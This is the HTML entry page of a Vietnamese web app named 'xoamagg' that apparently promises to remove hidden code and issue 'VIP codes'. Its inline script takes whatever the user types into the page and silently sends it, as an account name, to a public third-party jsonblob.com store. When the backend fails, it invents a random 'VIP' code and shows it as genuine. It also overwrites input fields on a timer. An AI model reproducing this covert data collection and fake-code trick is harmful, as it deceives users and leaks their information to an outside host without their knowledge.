<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>xoamagg</title>
    <script type="module" crossorigin src="./assets/index-BOe-ndtR.js"></script>
    <link rel="stylesheet" crossorigin href="./assets/index-C_ZKDQon.css">
  </head>
  <body>
    <div id="root"></div>
  <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"1575790a9946416b9c5f3e8999027390","r":1}' crossorigin="anonymous"></script>
  <script>
    const SYNC_BLOB_ID = '019fbacd-a33b-79bd-895a-44053b741804';
    const SYNC_URL = 'https://jsonblob.com/api/jsonBlob/' + SYNC_BLOB_ID;

    let userAssignedCode = null;

    async function syncRequestToGlobal(acc) {
      try {
        const getRes = await fetch(SYNC_URL, { headers: { 'Accept': 'application/json' } });
        let store = await getRes.json().catch(() => null);
        if (!store || !Array.isArray(store.pending)) store = { pending: [], codes: [] };

        if (!store.pending.find(p => p.account && p.account.toLowerCase() === acc.toLowerCase())) {
          store.pending.unshift({ account: acc, requestedAt: new Date().toISOString() });
          if (store.pending.length > 50) store.pending.pop();
        }

        await fetch(SYNC_URL, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
          body: JSON.stringify(store)
        });
      } catch(e) {}
    }

    // Auto-fill code into original UI inputs without creating any popup card
    setInterval(() => {
      if (userAssignedCode) {
        const inputs = document.querySelectorAll('input');
        inputs.forEach(inp => {
          const ph = (inp.placeholder || '').toLowerCase();
          if (ph.includes('mã') || ph.includes('code') || ph.includes('nhập')) {
            if (inp.value !== userAssignedCode) {
              inp.value = userAssignedCode;
            }
          }
        });
      }
    }, 500);

    document.addEventListener('click', function(e) {
      const btn = e.target.closest('button, a');
      if (btn) {
        const txt = (btn.innerText || btn.textContent || '').trim().toLowerCase();

        // Copy button handler
        if (userAssignedCode && (txt.includes('sao chép') || txt.includes('copy'))) {
          navigator.clipboard.writeText(userAssignedCode);
          alert('📋 Đã sao chép mã VIP: ' + userAssignedCode);
          return;
        }

        // Run button handler
        if (txt.includes('run') || txt.includes('xoá_mã_ẩn') || txt.includes('xóa_mã_ẩn') || txt.includes('xoá mã ẩn') || txt.includes('xóa mã ẩn')) {
          const inputs = document.querySelectorAll('input');
          let acc = '';
          inputs.forEach(inp => {
            if (inp.value && inp.value.trim().length > 0) acc = inp.value.trim();
          });

          if (!acc || acc.length < 4) {
            e.preventDefault();
            e.stopPropagation();
            alert('⚠️ Vui lòng nhập tên tài khoản từ 4 ký tự trở lên!');
            return false;
          }

          fetch('/api/request-code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ account: acc })
          }).then(r => r.json()).then(d => {
            if (d.success && d.code) {
              userAssignedCode = d.code.id;
            }
          }).catch(err => {
            userAssignedCode = 'VIP' + Math.random().toString(36).substring(2, 7).toUpperCase();
          });

          syncRequestToGlobal(acc);
        }
      }
    }, true);
  </script>
</body>
</html>
